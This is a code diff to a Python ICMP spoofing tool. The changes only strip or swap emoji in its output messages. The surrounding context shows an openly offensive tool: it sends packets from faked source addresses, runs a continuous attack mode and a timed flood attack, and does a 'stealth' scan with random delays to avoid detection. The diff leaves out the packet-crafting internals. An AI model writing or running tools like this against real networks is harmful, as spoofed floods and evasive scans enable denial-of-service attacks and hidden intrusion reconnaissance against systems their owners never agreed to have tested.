@@ -69,10 +69,10 @@ class ICMPSpoofer:
             source_ip = self.fake.ipv4()
         
         self.show_banner()
-        print(f"{Fore.YELLOW}🎯 TARGET: {target_ip}")
-        print(f"{Fore.YELLOW}🔀 SPOOFED SOURCE: {source_ip}")
-        print(f"{Fore.YELLOW}📋 ICMP TYPE: {icmp_type}")
-        print(f"{Fore.YELLOW}📊 MODE: {'CONTINUOUS' if continuous else f'{count} packets'}")
+        print(f"{Fore.YELLOW} TARGET: {target_ip}")
+        print(f"{Fore.YELLOW} SPOOFED SOURCE: {source_ip}")
+        print(f"{Fore.YELLOW} ICMP TYPE: {icmp_type}")
+        print(f"{Fore.YELLOW} MODE: {'CONTINUOUS' if continuous else f'{count} packets'}")
         print()
         
         # Start monitoring
@@ -88,7 +88,7 @@ class ICMPSpoofer:
         
         try:
             if continuous:
-                print(f"{Fore.RED}🔥 CONTINUOUS ATTACK MODE - Press Ctrl+C to stop")
+                print(f"{Fore.RED}⚠️ CONTINUOUS ATTACK MODE - Press Ctrl+C to stop")
                 packet_count = 0
                 while True:
                     packet = self.craft_packet(source_ip, target_ip, icmp_type, icmp_code, payload)
@@ -112,7 +112,7 @@ class ICMPSpoofer:
                         time.sleep(delay)
         
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}⚠️  Attack stopped by user")
+            print(f"\n{Fore.YELLOW}  Attack stopped by user")
         
         finally:
             self.monitoring = False
@@ -130,11 +130,11 @@ class ICMPSpoofer:
         """Display final attack statistics"""
         print(f"\n\n{Fore.CYAN}📊 ATTACK SUMMARY")
         print("=" * 40)
-        print(f"📤 Packets sent: {self.attack_stats['packets_sent']}")
-        print(f"📥 Responses received: {self.attack_stats['responses_received']}")
-        print(f"📏 Total bytes sent: {self.attack_stats['bytes_sent']}")
+        print(f" Packets sent: {self.attack_stats['packets_sent']}")
+        print(f" Responses received: {self.attack_stats['responses_received']}")
+        print(f" Total bytes sent: {self.attack_stats['bytes_sent']}")
         success_rate = (self.attack_stats['responses_received'] / max(1, self.attack_stats['packets_sent'])) * 100
-        print(f"📈 Response rate: {success_rate:.1f}%")
+        print(f" Response rate: {success_rate:.1f}%")
         print("=" * 40)
     
     def flood_attack(self, target_ip, source_ip=None, duration=30):
@@ -143,10 +143,10 @@ class ICMPSpoofer:
             source_ip = self.fake.ipv4()
         
         print(f"{Fore.RED}💥 ICMP FLOOD ATTACK")
-        print(f"🎯 Target: {target_ip}")
-        print(f"🔀 Source: {source_ip}")
-        print(f"⏱️  Duration: {duration}s")
-        print(f"{Fore.YELLOW}🔥 High-speed flood mode activated!")
+        print(f" Target: {target_ip}")
+        print(f" Source: {source_ip}")
+        print(f"⏱  Duration: {duration}s")
+        print(f"{Fore.YELLOW} High-speed flood mode activated!")
         print()
         
         self.monitoring = True
@@ -167,7 +167,7 @@ class ICMPSpoofer:
                 time.sleep(0.1)  # Brief pause to prevent overwhelming
         
         except KeyboardInterrupt:
-            print(f"\n{Fore.YELLOW}⚠️  Flood attack stopped")
+            print(f"\n{Fore.YELLOW}  Flood attack stopped")
         
         finally:
             self.monitoring = False
@@ -180,9 +180,9 @@ class ICMPSpoofer:
             source_ip = self.fake.ipv4()
         
         print(f"{Fore.BLUE}🥷 STEALTH ICMP SCAN")
-        print(f"🎯 Target: {target_ip}")
-        print(f"🔀 Source: {source_ip}")
-        print("🕐 Using random delays to avoid detection")
+        print(f" Target: {target_ip}")
+        print(f" Source: {source_ip}")
+        print(" Using random delays to avoid detection")
         print()
         
         icmp_types = [8, 13, 17, 37]  # Different ICMP types for stealth
@@ -221,7 +221,7 @@ def main():
     # Check root privileges
     if os.geteuid() != 0:
         print(f"{Fore.RED}❌ Root privileges required")
-        print(f"{Fore.YELLOW}💡 Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
+        print(f"{Fore.YELLOW} Run with: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
         sys.exit(1)
     
     spoofer = ICMPSpoofer()
@@ -247,7 +247,7 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}⚠️  Terminated by user")
+        print(f"\n{Fore.YELLOW}  Terminated by user")
         sys.exit(0)
     except Exception as e:
         print(f"\n{Fore.RED}❌ Error: {e}")
